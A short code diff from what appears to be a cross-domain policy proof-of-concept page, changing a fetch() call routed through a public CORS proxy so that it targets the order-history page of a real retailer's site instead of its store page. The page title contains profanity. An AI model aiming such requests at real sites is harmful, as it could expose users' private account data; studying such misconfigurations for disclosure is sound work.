@@ -4,7 +4,7 @@
     <title>Cross-Domain Policy fuck PoC</title>
     <script>
         function makeRequest() {
-            fetch('https://cors-anywhere.herokuapp.com/https://www.oneplus.in/store')
+            fetch('https://cors-anywhere.herokuapp.com/https://www.oneplus.in/sales/order/history')
                 .then(response => {
                     if (response.ok) {
                         return response.text();
